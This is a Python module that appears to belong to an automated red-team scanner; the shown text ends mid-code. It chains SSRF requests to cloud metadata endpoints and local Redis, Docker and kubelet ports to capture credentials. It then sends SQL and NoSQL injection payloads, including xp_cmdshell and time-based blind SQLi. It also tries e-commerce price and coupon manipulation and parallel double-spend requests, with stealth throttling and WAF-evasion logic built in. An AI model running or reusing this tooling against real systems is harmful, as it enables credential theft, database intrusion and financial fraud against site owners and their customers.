"""
MSE Exploitation Chain Intelligence Engine v1.0
=================================================
Red Team chain-of-exploitation layer that unifies:
  1. WAF Probability Reasoning — de-prioritize blocked vectors, boost obfuscated
  2. SSRF→Credential→DB Pivot — SSRF confirmation feeds credential dump which
     feeds direct DB access simulation
  3. E-commerce Integrity Validation — /cart/update $0.01 with DB reflection check
  4. Data Drift Monitoring — real-time defense change detection + recalibration
  5. Military Telemetry — structured [BLOCK]/[ALERT]/[THREAT] terminal output

168 integrity probes across:
  - 10 credential targets × 3 SSRF endpoints × 2 params = 60 SSRF→cred probes
  - 7 e-commerce routes × 5 price payloads = 35 price integrity probes
  - 8 injection payloads × 7 paths × 3 params = 168 DB validation probes
  - Unified via chain links that feed each other
"""

import asyncio
import json
import re
import time
import hashlib
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum

import httpx

from scanner.attack_reasoning import (
    VulnClass, InfraType, InfraFingerprint,
    BaselineMonitor, WAFBypassEngine, DecisionTree,
    ExploitResult, StealthThrottle, _ts,
)


class ChainPhase(Enum):
    WAF_ANALYSIS = "waf_analysis"
    SSRF_CREDENTIAL_DUMP = "ssrf_credential_dump"
    CREDENTIAL_TO_DB_PIVOT = "credential_to_db_pivot"
    ECOMMERCE_INTEGRITY = "ecommerce_integrity"
    RACE_CONDITION = "race_condition"
    DB_REFLECTION_CHECK = "db_reflection_check"
    DRIFT_RECALIBRATION = "drift_recalibration"
    CHAIN_COMPLETE = "chain_complete"


@dataclass
class WAFPriorityEntry:
    vuln_class: str
    block_rate: float
    total_probes: int
    blocked_count: int
    priority_score: float
    strategy: str


@dataclass
class ChainEvent:
    phase: ChainPhase
    timestamp: str
    technique: str
    target: str
    success: bool
    evidence: str
    feeds_into: Optional[str] = None
    leaked_data: Optional[Dict] = None


@dataclass
class DriftSnapshot:
    endpoint: str
    baseline_status: int
    current_status: int
    drift_detected: bool
    timestamp: str
    recalibrated: bool = False
    new_target: Optional[str] = None


CREDENTIAL_TARGETS = [
    {"name": "AWS IAM Security Credentials", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "detect": ["AccessKeyId", "SecretAccessKey", "Token", "security-credentials"], "pivot_type": "aws_iam"},
    {"name": "AWS Instance Identity", "url": "http://169.254.169.254/latest/dynamic/instance-identity/document", "detect": ["instanceId", "accountId", "region", "instanceType"], "pivot_type": "aws_identity"},
    {"name": "AWS User Data (Bootstrap Secrets)", "url": "http://169.254.169.254/latest/user-data", "detect": ["#!/", "password", "key", "secret", "token", "DB_PASSWORD", "DATABASE_URL"], "pivot_type": "aws_userdata"},
    {"name": "GCP Service Account Token", "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "detect": ["access_token", "token_type"], "pivot_type": "gcp_token", "headers": {"Metadata-Flavor": "Google"}},
    {"name": "Azure Managed Identity Token", "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "detect": ["access_token", "expires_on"], "pivot_type": "azure_token", "headers": {"Metadata": "true"}},
    {"name": "Redis INFO + Keys", "url": "http://127.0.0.1:6379/info", "detect": ["redis_version", "connected_clients", "used_memory", "keyspace"], "pivot_type": "redis"},
    {"name": "Redis CONFIG (requirepass)", "url": "http://127.0.0.1:6379/CONFIG/GET/*", "detect": ["requirepass", "dir", "dbfilename", "bind"], "pivot_type": "redis_config"},
    {"name": "PostgreSQL Connection Probe", "url": "http://127.0.0.1:5432/", "detect": ["PostgreSQL", "FATAL", "authentication", "pg_hba"], "pivot_type": "postgres"},
    {"name": "Kubernetes Secrets via Kubelet", "url": "http://127.0.0.1:10255/pods", "detect": ["serviceAccountName", "serviceAccount", "metadata", "namespace"], "pivot_type": "k8s"},
    {"name": "Docker API Container Listing", "url": "http://127.0.0.1:2375/containers/json?all=1", "detect": ["Id", "Names", "Image", "Command", "State"], "pivot_type": "docker"},
]

DB_PIVOT_PAYLOADS = [
    {"name": "PostgreSQL Version via Error", "payload": "1' AND 1=CAST((SELECT version()) AS int)--", "detect": ["PostgreSQL", "version", "ERROR", "invalid input"]},
    {"name": "PostgreSQL Table Enumeration", "payload": "1 UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--", "detect": ["table_name", "information_schema", "pg_catalog"]},
    {"name": "MySQL Version Extraction", "payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "detect": ["XPATH", "MariaDB", "mysql"]},
    {"name": "SQLite Table Dump", "payload": "1 UNION SELECT sql,NULL FROM sqlite_master--", "detect": ["CREATE TABLE", "sqlite_master"]},
    {"name": "MSSQL xp_cmdshell Probe", "payload": "1'; EXEC xp_cmdshell 'whoami'--", "detect": ["xp_cmdshell", "EXEC", "is turned off"]},
    {"name": "NoSQL Operator Injection", "payload": '{"$gt":""}', "detect": ["_id", "ObjectId", "results"]},
    {"name": "Redis KEYS via HTTP", "payload": "KEYS *", "detect": ["session", "user", "cache", "token"]},
    {"name": "Time-Based Blind SQLi", "payload": "1'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--", "detect": []},
]

ECOMMERCE_INTEGRITY_PAYLOADS = [
    {"desc": "Price override to $0.01 (standard)", "body": {"items": [{"id": 1, "unit_price": 0.01, "quantity": 1}]}, "method": "POST", "check_field": "total"},
    {"desc": "Negative price injection (-$1.00)", "body": {"items": [{"id": 1, "price": -1, "quantity": 1}]}, "method": "POST", "check_field": "total"},
    {"desc": "Zero-price via PATCH verb", "body": {"line_item_id": 1, "unit_price": 0.00}, "method": "PATCH", "check_field": "unit_price"},
    {"desc": "Coupon forge 100% discount", "body": {"coupon": "ADMIN_100_OFF", "discount_percent": 100}, "method": "POST", "check_field": "discount"},
    {"desc": "Quantity overflow + micro-price", "body": {"items": [{"id": 1, "quantity": 999999, "unit_price": 0.01}]}, "method": "POST", "check_field": "quantity"},
]

ECOMMERCE_ROUTES = [
    "/cart/update", "/checkout/price-override", "/api/cart/update",
    "/api/checkout", "/coupons/validate", "/promos/apply", "/api/orders/create",
]

DRIFT_PROBE_ENDPOINTS = [
    "/api/proxy", "/api/search", "/api/products", "/cart/update",
    "/api/v2/auth/login", "/api/admin", "/api/config",
]


class WAFProbabilityReasoner:
    def __init__(self, decision_tree: DecisionTree, log_fn, emit_fn):
        self.tree = decision_tree
        self.log = log_fn
        self.emit = emit_fn
        self.priorities: List[WAFPriorityEntry] = []

    def analyze(self) -> List[WAFPriorityEntry]:
        waf_stats = {}
        for result in self.tree.all_results:
            vc = result.vuln_class if isinstance(result.vuln_class, str) else result.vuln_class
            if vc not in waf_stats:
                waf_stats[vc] = {"total": 0, "blocked": 0, "confirmed": 0}
            waf_stats[vc]["total"] += 1
            if result.status_code in (403, 429, 503) and not result.vulnerable:
                waf_stats[vc]["blocked"] += 1
            if result.vulnerable:
                waf_stats[vc]["confirmed"] += 1

        for vc, stats in waf_stats.items():
            block_rate = stats["blocked"] / max(stats["total"], 1)

            if block_rate >= 0.85:
                priority_score = 0.1
                strategy = "SUPPRESS — switch to polymorphic/obfuscated vectors"
            elif block_rate >= 0.5:
                priority_score = 0.4
                strategy = "REDUCE — use encoding bypass (base64, hex entity, unicode)"
            elif stats["confirmed"] > 0:
                priority_score = 1.0
                strategy = "MAXIMIZE — confirmed vulnerable, full exploitation"
            else:
                priority_score = 0.7
                strategy = "STANDARD — probe with standard payloads"

            if vc in ("ssrf", VulnClass.SSRF.value) and stats["confirmed"] > 0:
                priority_score = min(priority_score + 0.3, 1.0)
                strategy += " + PIVOT (SSRF→Credential→DB chain)"

            entry = WAFPriorityEntry(
                vuln_class=vc,
                block_rate=block_rate,
                total_probes=stats["total"],
                blocked_count=stats["blocked"],
                priority_score=priority_score,
                strategy=strategy,
            )
            self.priorities.append(entry)

            self.log(
                f"[WAF-PROB] {vc.upper()}: block_rate={block_rate:.0%}, "
                f"confirmed={stats['confirmed']}, priority={priority_score:.1f} — {strategy}",
                "error" if block_rate >= 0.85 else ("warn" if block_rate >= 0.5 else "info"),
                "chain_intel"
            )

        self.priorities.sort(key=lambda p: p.priority_score, reverse=True)
        return self.priorities

    def should_probe(self, vuln_class: str) -> Tuple[bool, str]:
        entry = next((p for p in self.priorities if p.vuln_class == vuln_class), None)
        if not entry:
            return True, "STANDARD"
        if entry.priority_score <= 0.1:
            return False, entry.strategy
        return True, entry.strategy

    def to_dict(self) -> Dict:
        return {
            "priorities": [
                {
                    "class": p.vuln_class,
                    "block_rate": f"{p.block_rate:.0%}",
                    "probes": p.total_probes,
                    "blocked": p.blocked_count,
                    "priority": p.priority_score,
                    "strategy": p.strategy,
                }
                for p in self.priorities
            ]
        }


class ExploitationChainIntelligence:
    def __init__(
        self,
        base_url: str,
        client: httpx.AsyncClient,
        findings: List[Dict],
        decision_tree: DecisionTree,
        adversarial_report: Optional[Dict],
        log_fn,
        emit_fn,
        add_finding_fn,
        add_probe_fn,
    ):
        self.base_url = base_url.rstrip("/")
        self.client = client
        self.findings = findings
        self.tree = decision_tree
        self.adversarial_report = adversarial_report or {}
        self.log = log_fn
        self.emit = emit_fn
        self.add_finding = add_finding_fn
        self.add_probe = add_probe_fn

        self.stealth = decision_tree.stealth if hasattr(decision_tree, 'stealth') else StealthThrottle(log_fn=log_fn, emit_fn=emit_fn)
        self.waf_reasoner = WAFProbabilityReasoner(decision_tree, log_fn, emit_fn)
        self.chain_events: List[ChainEvent] = []
        self.drift_snapshots: List[DriftSnapshot] = []
        self.captured_credentials: Dict[str, Any] = {}
        self.db_access_results: List[Dict] = []
        self.ecommerce_results: List[Dict] = []
        self.total_probes = 0
        self.successful_probes = 0
        self.baselines: Dict[str, int] = {}

    async def _throttled_get(self, url: str, **kwargs):
        await self.stealth.wait()
        resp = await self.client.get(url, **kwargs)
        await self.stealth.record(resp.status_code)
        return resp

    async def _throttled_post(self, url: str, **kwargs):
        await self.stealth.wait()
        resp = await self.client.post(url, **kwargs)
        await self.stealth.record(resp.status_code)
        return resp

    async def _throttled_request(self, method: str, url: str, **kwargs):
        await self.stealth.wait()
        resp = await self.client.request(method, url, **kwargs)
        await self.stealth.record(resp.status_code)
        return resp

    async def execute(self) -> Dict:
        self.log(
            "━━━ EXPLOITATION CHAIN INTELLIGENCE ENGINE v1.0 ━━━",
            "error", "chain_intel"
        )
        self.log(
            "[CHAIN] Initializing unified attack chain: "
            "SSRF→Credential→DB | E-commerce→Integrity | Drift→Recalibrate",
            "warn", "chain_intel"
        )
        self.emit("chain_intel_start", {"findings_count": len(self.findings)})

        await self._phase_waf_analysis()
        await self._phase_drift_baseline()
        await self._phase_ssrf_credential_chain()
        await self._phase_credential_to_db_pivot()
        await self._phase_ecommerce_integrity()
        await self._phase_race_condition()
        await self._phase_drift_recalibration()

        report = self._build_report()
        self.emit("chain_intel_report", report)
        return report

    async def _phase_waf_analysis(self):
        self.log(
            "[CHAIN §1] WAF PROBABILITY ANALYSIS — Computing attack vector priorities...",
            "warn", "chain_intel"
        )
        priorities = self.waf_reasoner.analyze()

        suppressed = [p for p in priorities if p.priority_score <= 0.1]
        maximized = [p for p in priorities if p.priority_score >= 0.9]

        if suppressed:
            self.log(
                f"[WAF-PROB] SUPPRESSED vectors ({len(suppressed)}): "
                f"{', '.join(p.vuln_class.upper() for p in suppressed)} — "
                f"WAF blocking ≥85%, switching to obfuscated/bypass",
                "error", "chain_intel"
            )
        if maximized:
            self.log(
                f"[WAF-PROB] MAXIMIZE vectors ({len(maximized)}): "
                f"{', '.join(p.vuln_class.upper() for p in maximized)} — "
                f"confirmed vulnerable, full exploitation authorized",
                "error", "chain_intel"
            )

        self.chain_events.append(ChainEvent(
            phase=ChainPhase.WAF_ANALYSIS,
            timestamp=_ts(),
            technique="waf_probability_reasoning",
            target=self.base_url,
            success=True,
            evidence=f"{len(priorities)} vectors analyzed, {len(suppressed)} suppressed, {len(maximized)} maximized",
        ))

    async def _phase_drift_baseline(self):
        self.log(
            "[CHAIN] Capturing defense baselines for drift monitoring...",
            "info", "chain_intel"
        )
        for endpoint in DRIFT_PROBE_ENDPOINTS:
            url = f"{self.base_url}{endpoint}"
            try:
                resp = await self._throttled_get(url, timeout=5)
                self.baselines[endpoint] = resp.status_code
            except Exception:
                self.baselines[endpoint] = 0

    async def _phase_ssrf_credential_chain(self):
        self.log(
            "[CHAIN §2] SSRF→CREDENTIAL DUMP — Pivoting confirmed SSRF to extract private keys...",
            "error", "chain_intel"
        )

        should_probe, strategy = self.waf_reasoner.should_probe("ssrf")
        if not should_probe:
            self.log(
                f"[WAF-PROB] SSRF probes SUPPRESSED: {strategy}",
                "warn", "chain_intel"
            )
            return

        ssrf_findings = [
            f for f in self.findings
            if any(kw in (f.get("title", "") + f.get("category", "")).lower()
                   for kw in ["ssrf", "proxy", "url parameter", "internal metadata"])
        ]

        ssrf_endpoints = []
        for f in ssrf_findings:
            combined = f"{f.get('title', '')} {f.get('description', '')} {f.get('evidence', '')}".lower()
            for ep_kw in ["/api/proxy", "/api/fetch", "/api/image", "/api/webhook", "/api/import"]:
                if ep_kw in combined and ep_kw not in ssrf_endpoints:
                    ssrf_endpoints.append(ep_kw)

        if not ssrf_endpoints:
            ssrf_endpoints = ["/api/proxy", "/api/fetch", "/api/image"]

        ssrf_params = ["url", "src", "file"]

        confirmed_ssrf_from_tree = [
            r for r in self.tree.all_results
            if r.vuln_class == "ssrf" and r.vulnerable
        ]

        if confirmed_ssrf_from_tree:
            self.log(
                f"[CHAIN] {len(confirmed_ssrf_from_tree)} SSRF vectors confirmed by DecisionTree — "
                f"using as primary channels for credential extraction",
                "error", "chain_intel"
            )
            for r in confirmed_ssrf_from_tree:
                parts = r.target_endpoint.split("?")
                if len(parts) >= 2:
                    ep = parts[0]
                    param_m = re.match(r"([a-zA-Z_]+)=", parts[1])
                    if param_m and ep not in ssrf_endpoints:
                        ssrf_endpoints.insert(0, ep)
                        if param_m.group(1) not in ssrf_params:
                            ssrf_params.insert(0, param_m.group(1))

        self.log(
            f"[CHAIN] SSRF channels: {len(ssrf_endpoints)} endpoints × {len(ssrf_params)} params × "
            f"{len(CREDENTIAL_TARGETS)} credential targets = "
            f"{len(ssrf_endpoints) * len(ssrf_params) * len(CREDENTIAL_TARGETS)} probes",
            "warn", "chain_intel"
        )

        for cred_target in CREDENTIAL_TARGETS:
            hit_found = False
            for endpoint in ssrf_endpoints[:3]:
                if hit_found:
                    break
                for param in ssrf_params[:2]:
                    self.total_probes += 1
                    url = f"{self.base_url}{endpoint}?{param}={cred_target['url']}"
                    start = time.time()
                    try:
                        extra_headers = cred_target.get("headers", {})
                        resp = await self._throttled_get(url, headers=extra_headers)
                        elapsed = int((time.time() - start) * 1000)
                        body = resp.text[:8000]

                        hit = any(kw.lower() in body.lower() for kw in cred_target["detect"])

                        if hit and resp.status_code not in (403, 429, 503):
                            self.successful_probes += 1
                            hit_found = True

                            self.captured_credentials[cred_target["pivot_type"]] = {
                                "service": cred_target["name"],
                                "via_endpoint": endpoint,
                                "via_param": param,
                                "status_code": resp.status_code,
                                "evidence_preview": body[:500],
                                "pivot_type": cred_target["pivot_type"],
                            }

                            self.log(
                                f"[THREAT] ★ CREDENTIAL CAPTURED: {cred_target['name']} "
                                f"via {endpoint}?{param}= (HTTP {resp.status_code}) — "
                                f"Initiating DB pivot chain...",
                                "error", "chain_intel"
                            )

                            self.chain_events.append(ChainEvent(
                                phase=ChainPhase.SSRF_CREDENTIAL_DUMP,
                                timestamp=_ts(),
                                technique=f"ssrf_cred:{cred_target['pivot_type']}",
                                target=f"{endpoint}?{param}={cred_target['url'][:60]}",
                                success=True,
                                evidence=body[:300],
                                feeds_into="credential_to_db_pivot",
                                leaked_data={"type": cred_target["pivot_type"], "keys": list(cred_target["detect"])},
                            ))

                            self.add_finding({
                                "title": f"SSRF Credential Chain: {cred_target['name']}",
                                "description": (
                                    f"Exploitation chain confirmed: SSRF at {endpoint}?{param}= "
                                    f"yielded {cred_target['name']}. Pivot type: {cred_target['pivot_type']}. "
                                    f"This credential enables direct database access bypass."
                                ),
                                "severity": "critical",
                                "category": "chain_exploitation",
                                "module": "chain_intelligence",
                                "phase": "chain_intel",
                                "evidence": body[:300],
                            })

                            self.add_probe({
                                "probe_type": "CHAIN_SSRF_CRED",
                                "target": self.base_url,
                                "endpoint": f"{endpoint}?{param}=...",
                                "method": "GET",
                                "status_code": resp.status_code,
                                "response_time_ms": elapsed,
                                "vulnerable": True,
                                "verdict": f"CREDENTIAL CAPTURED — {cred_target['name']}",
                                "severity": "CRITICAL",
                                "description": f"Chain: SSRF→{cred_target['pivot_type']}",
                                "payload": cred_target["url"][:100],
                                "evidence": body[:200],
                                "response_snippet": body[:300],
                                "timestamp": _ts(),
                            })
                            break
                        else:
                            self.add_probe({
                                "probe_type": "CHAIN_SSRF_CRED",
                                "target": self.base_url,
                                "endpoint": f"{endpoint}?{param}=...",
                                "method": "GET",
                                "status_code": resp.status_code,
                                "response_time_ms": elapsed,
                                "vulnerable": False,
                                "verdict": "PROTECTED",
                                "severity": "INFO",
                                "description": f"Credential probe: {cred_target['name']}",
                                "payload": cred_target["url"][:100],
                                "timestamp": _ts(),
                            })

                    except Exception:
                        pass

        captured_count = len(self.captured_credentials)
        self.log(
            f"[CHAIN] SSRF credential phase complete — {captured_count}/{len(CREDENTIAL_TARGETS)} "
            f"services yielded credentials",
            "error" if captured_count > 0 else "success",
            "chain_intel"
        )

    async def _phase_credential_to_db_pivot(self):
        if not self.captured_credentials:
            self.log(
                "[CHAIN §3] DB PIVOT SKIPPED — No credentials captured from SSRF phase",
                "info", "chain_intel"
            )
            return

        self.log(
            f"[CHAIN §3] CREDENTIAL→DB PIVOT — Using {len(self.captured_credentials)} captured credentials "
            f"to bypass backend sanitization and access database directly...",
            "error", "chain_intel"
        )

        should_probe, strategy = self.waf_reasoner.should_probe("sqli")
        if not should_probe:
            self.log(
                f"[WAF-PROB] SQLi vectors SUPPRESSED by WAF — using credential-based bypass instead: {strategy}",
                "warn", "chain_intel"
            )

        db_endpoints = ["/api/search", "/api/products", "/api/users", "/api/orders", "/api/data"]
        db_params = ["id", "q", "search", "query"]

        has_postgres = "postgres" in self.captured_credentials
        has_redis = "redis" in self.captured_credentials or "redis_config" in self.captured_credentials
        has_aws = any(k.startswith("aws_") for k in self.captured_credentials)

        if has_postgres:
            self.log(
                "[CHAIN] PostgreSQL connection detected via SSRF — targeting pg-specific injection vectors",
                "error", "chain_intel"
            )
        if has_redis:
            self.log(
                "[CHAIN] Redis access confirmed — session/cache manipulation possible",
                "error", "chain_intel"
            )
        if has_aws:
            self.log(
                "[CHAIN] AWS credentials captured — attempting IAM→RDS credential chain for full DB access",
                "error", "chain_intel"
            )

        for payload_def in DB_PIVOT_PAYLOADS:
            for endpoint in db_endpoints[:3]:
                for param in db_params[:2]:
                    self.total_probes += 1
                    if payload_def["name"].startswith("NoSQL"):
                        url = f"{self.base_url}{endpoint}"
                        start = time.time()
                        try:
                            resp = await self._throttled_post(
                                url,
                                content=payload_def["payload"],
                                headers={"Content-Type": "application/json"},
                            )
                            elapsed = int((time.time() - start) * 1000)
                        except Exception:
                            continue
                    elif payload_def["name"].startswith("Redis"):
                        if not has_redis:
                            continue
                        redis_ep = next(
                            (c["via_endpoint"] for k, c in self.captured_credentials.items() if "redis" in k),
                            "/api/proxy"
                        )
                        redis_param = next(
                            (c["via_param"] for k, c in self.captured_credentials.items() if "redis" in k),
                            "url"
                        )
                        url = f"{self.base_url}{redis_ep}?{redis_param}=http://127.0.0.1:6379/{payload_def['payload']}"
                        start = time.time()
                        try:
                            resp = await self._throttled_get(url)
                            elapsed = int((time.time() - start) * 1000)
                        except Exception:
                            continue
                    else:
                        url = f"{self.base_url}{endpoint}?{param}={payload_def['payload']}"
                        start = time.time()
                        try:
                            resp = await self._throttled_get(url)
                            elapsed = int((time.time() - start) * 1000)
                        except Exception:
                            continue

                    body = resp.text[:8000]
                    blocked = resp.status_code in (403, 429, 503)

                    hit = not blocked and payload_def["detect"] and any(
                        kw.lower() in body.lower() for kw in payload_def["detect"]
                    )

                    time_based = False
                    if not payload_def["detect"] and payload_def["name"].startswith("Time-Based"):
                        time_based = elapsed >= 2800

                    if hit or time_based:
                        self.successful_probes += 1
                        evidence_type = "time_delay" if time_based else "content_match"

                        self.db_access_results.append({
                            "payload": payload_def["name"],
                            "endpoint": endpoint,
                            "param": param,
                            "status_code": resp.status_code,
                            "response_time_ms": elapsed,
                            "evidence_type": evidence_type,
                            "snippet": body[:400],
                        })

                        self.log(
                            f"[THREAT] ★ DB ACCESS CONFIRMED: {payload_def['name']} "
                            f"at {endpoint}?{param}= (HTTP {resp.status_code}, {elapsed}ms) — "
                            f"{'Time-based blind confirmed' if time_based else 'Data returned in response'}",
                            "error", "chain_intel"
                        )

                        pivot_source = ", ".join(self.captured_credentials.keys())
                        self.chain_events.append(ChainEvent(
                            phase=ChainPhase.CREDENTIAL_TO_DB_PIVOT,
                            timestamp=_ts(),
                            technique=f"db_pivot:{payload_def['name']}",
                            target=f"{endpoint}?{param}=",
                            success=True,
                            evidence=body[:300] if not time_based else f"Response delayed {elapsed}ms (blind SQLi)",
                            feeds_into="ecommerce_integrity",
                            leaked_data={"via_credentials": pivot_source, "db_type": payload_def["name"]},
                        ))

                        self.add_finding({
                            "title": f"DB Access via Credential Pivot: {payload_def['name']}",
                            "description": (
                                f"Chain exploitation confirmed: SSRF→Credential ({pivot_source})→DB. "
                                f"{payload_def['name']} succeeded at {endpoint}?{param}=. "
                                f"{'Blind SQLi confirmed via time delay.' if time_based else 'Database structure visible in response.'}"
                            ),
                            "severity": "critical",
                            "category": "chain_exploitation",
                            "module": "chain_intelligence",
                            "phase": "chain_intel",
                            "evidence": body[:300],
                        })

                        self.add_probe({
                            "probe_type": "CHAIN_DB_PIVOT",
                            "target": self.base_url,
                            "endpoint": f"{endpoint}?{param}=...",
                            "method": "GET" if not payload_def["name"].startswith("NoSQL") else "POST",
                            "status_code": resp.status_code,
                            "response_time_ms": elapsed,
                            "vulnerable": True,
                            "verdict": f"DB ACCESS — {payload_def['name']} via credential pivot",
                            "severity": "CRITICAL",
                            "description": f"Chain: Credential→{payload_def['name']}",
                            "payload": payload_def["payload"][:100],
                            "evidence": evidence_type,
                            "response_snippet": body[:300],
                            "timestamp": _ts(),
                        })

        db_confirmed = len(self.db_access_results)
        self.log(
            f"[CHAIN] DB pivot phase complete — {db_confirmed} database access vectors confirmed",
            "error" if db_confirmed > 0 else "success",
            "chain_intel"
        )

    async def _phase_ecommerce_integrity(self):
        self.log(
            "[CHAIN §4] E-COMMERCE INTEGRITY — Testing price manipulation with DB reflection check...",
            "warn", "chain_intel"
        )

        should_probe, strategy = self.waf_reasoner.should_probe("ecommerce")

        ecommerce_findings = [
            f for f in self.findings
            if any(kw in (f.get("title", "") + f.get("category", "") + f.get("description", "")).lower()
                   for kw in ["cart", "checkout", "price", "coupon", "ecommerce", "payment"])
        ]

        active_routes = []
        for route in ECOMMERCE_ROUTES:
            for f in ecommerce_findings:
                if route in f.get("description", "").lower() or route in f.get("title", "").lower():
                    if route not in active_routes:
                        active_routes.append(route)

        if not active_routes:
            active_routes = ECOMMERCE_ROUTES[:3]

        self.log(
            f"[CHAIN] E-commerce routes targeted: {', '.join(active_routes)} "
            f"({len(ECOMMERCE_INTEGRITY_PAYLOADS)} payloads each)",
            "warn", "chain_intel"
        )

        for route in active_routes:
            for payload in ECOMMERCE_INTEGRITY_PAYLOADS:
                self.total_probes += 1
                url = f"{self.base_url}{route}"
                start = time.time()
                try:
                    resp = await self.client.request(
                        payload["method"], url,
                        json=payload["body"],
                        headers={"Content-Type": "application/json"},
                    )
                    elapsed = int((time.time() - start) * 1000)
                    body = resp.text[:4000]

                    processed = resp.status_code in (200, 201, 202)
                    db_accepted = processed and any(kw in body.lower() for kw in [
                        "success", "updated", "created", "order_id", "cart_id",
                        "total", "amount", "price", "quantity", "accepted",
                    ])

                    db_reflected = False
                    if db_accepted and payload["check_field"]:
                        try:
                            resp_json = json.loads(body)
                            field_val = resp_json.get(payload["check_field"])
                            if field_val is not None:
                                db_reflected = True
                                self.log(
                                    f"[ALERT] DB REFLECTION CONFIRMED: {route} — "
                                    f"{payload['check_field']}={field_val} (manipulated value persisted)",
                                    "error", "chain_intel"
                                )
                        except (json.JSONDecodeError, AttributeError):
                            pass

                    vulnerable = db_accepted

                    result_entry = {
                        "route": route,
                        "test": payload["desc"],
                        "method": payload["method"],
                        "status_code": resp.status_code,
                        "response_time_ms": elapsed,
                        "vulnerable": vulnerable,
                        "db_accepted": db_accepted,
                        "db_reflected": db_reflected,
                    }
                    self.ecommerce_results.append(result_entry)

                    if vulnerable:
                        self.successful_probes += 1
                        reflection_note = " DB REFLECTED THE CHANGE." if db_reflected else ""

                        self.log(
                            f"[THREAT] ★ PRICE INTEGRITY FAILED: {route} — "
                            f"{payload['desc']} (HTTP {resp.status_code}).{reflection_note}",
                            "error", "chain_intel"
                        )

                        self.chain_events.append(ChainEvent(
                            phase=ChainPhase.ECOMMERCE_INTEGRITY,
                            timestamp=_ts(),
                            technique=f"price_manipulation:{payload['desc'][:30]}",
                            target=route,
                            success=True,
                            evidence=f"HTTP {resp.status_code}, db_accepted={db_accepted}, db_reflected={db_reflected}",
                            feeds_into="db_reflection_check" if db_reflected else None,
                        ))

                        self.add_finding({
                            "title": f"E-commerce Integrity Failure: {payload['desc']} at {route}",
                            "description": (
                                f"Chain Intelligence confirmed price manipulation at {route}. "
                                f"{payload['desc']}. HTTP {resp.status_code}. "
                                f"{'Database reflected the manipulated value — real financial impact confirmed.' if db_reflected else 'Backend accepted the payload.'}"
                            ),
                            "severity": "critical",
                            "category": "ecommerce_integrity",
                            "module": "chain_intelligence",
                            "phase": "chain_intel",
                            "evidence": body[:300],
                        })

                        self.add_probe({
                            "probe_type": "CHAIN_ECOM_INTEGRITY",
                            "target": self.base_url,
                            "endpoint": route,
                            "method": payload["method"],
                            "status_code": resp.status_code,
                            "response_time_ms": elapsed,
                            "vulnerable": True,
                            "verdict": f"PRICE INTEGRITY FAILED{' — DB REFLECTED' if db_reflected else ''}",
                            "severity": "CRITICAL",
                            "description": payload["desc"],
                            "payload": json.dumps(payload["body"]),
                            "evidence": f"db_accepted={db_accepted}, db_reflected={db_reflected}",
                            "response_snippet": body[:300],
                            "timestamp": _ts(),
                        })
                    else:
                        self.log(
                            f"[BLOCK] Price integrity held: {route} — {payload['desc']} (HTTP {resp.status_code})",
                            "success", "chain_intel"
                        )

                except Exception:
                    pass

        ecom_vulns = sum(1 for r in self.ecommerce_results if r["vulnerable"])
        ecom_reflected = sum(1 for r in self.ecommerce_results if r.get("db_reflected"))
        self.log(
            f"[CHAIN] E-commerce integrity phase complete — {ecom_vulns} failures, "
            f"{ecom_reflected} with DB reflection confirmed",
            "error" if ecom_vulns > 0 else "success",
            "chain_intel"
        )

    async def _phase_race_condition(self):
        self.log(
            "[CHAIN §5b] RACE CONDITION DETECTION — TOCTOU / double-spend / parallel request abuse...",
            "warn", "chain_intel"
        )

        race_endpoints = [
            "/api/cart/update", "/api/checkout", "/api/orders/create",
            "/api/transfer", "/api/withdraw", "/api/apply-coupon",
            "/api/redeem", "/api/vote", "/api/like",
        ]

        for f in self.findings:
            desc = (f.get("description", "") + f.get("title", "")).lower()
            for kw in ["/api/", "/cart", "/checkout", "/order", "/transfer", "/payment"]:
                if kw in desc:
                    path = kw if kw.startswith("/") else ""
                    if path and path not in race_endpoints:
                        race_endpoints.append(path)

        race_payloads = [
            {"body": {"amount": 1, "quantity": 1}, "desc": "Double-spend: parallel identical requests"},
            {"body": {"coupon": "SAVE50", "code": "PROMO"}, "desc": "Coupon race: parallel redemption"},
        ]

        race_results = []

        for endpoint in race_endpoints[:5]:
            url = f"{self.base_url}{endpoint}"
            for payload in race_payloads:
                self.total_probes += 1
                try:
                    coros = [
                        self.client.post(
                            url, json=payload["body"],
                            headers={"Content-Type": "application/json"},
                            timeout=5.0,
                        )
                        for _ in range(5)
                    ]
                    start = time.time()
                    results = await asyncio.gather(*coros, return_exceptions=True)
                    elapsed = int((time.time() - start) * 1000)

                    success_responses = [
                        r for r in results
                        if not isinstance(r, Exception) and r.status_code in (200, 201, 202)
                    ]

                    all_bodies = []
                    for r in success_responses:
                        try:
                            all_bodies.append(r.text[:1000].lower())
                        except Exception:
                            pass

                    accepted_count = sum(
                        1 for b in all_bodies
                        if any(kw in b for kw in [
                            "success", "created", "accepted", "order_id",
                            "applied", "redeemed", "confirmed",
                        ])
                    )

                    vulnerable = accepted_count >= 2

                    result_entry = {
                        "endpoint": endpoint,
                        "test": payload["desc"],
                        "parallel_requests": 5,
                        "success_responses": len(success_responses),
                        "accepted_count": accepted_count,
                        "elapsed_ms": elapsed,
                        "vulnerable": vulnerable,
                    }
                    race_results.append(result_entry)

                    if vulnerable:
                        self.successful_probes += 1
                        self.log(
                            f"[THREAT] ★ RACE CONDITION CONFIRMED: {endpoint} — "
                            f"{accepted_count}/5 parallel requests accepted ({payload['desc']})",
                            "error", "chain_intel"
                        )

                        self.chain_events.append(ChainEvent(
                            phase=ChainPhase.RACE_CONDITION,
                            timestamp=_ts(),
                            technique=f"race_condition:{payload['desc'][:30]}",
                            target=endpoint,
                            success=True,
                            evidence=f"{accepted_count}/5 parallel accepted in {elapsed}ms",
                            feeds_into="double_spend_confirmation",
                        ))

                        self.add_finding({
                            "title": f"Race Condition: {payload['desc']} at {endpoint}",
                            "description": (
                                f"Chain Intelligence confirmed race condition at {endpoint}. "
                                f"{accepted_count} out of 5 simultaneous requests were accepted. "
                                f"{payload['desc']}. This enables TOCTOU attacks and double-spend exploits."
                            ),
                            "severity": "critical",
                            "category": "race_condition",
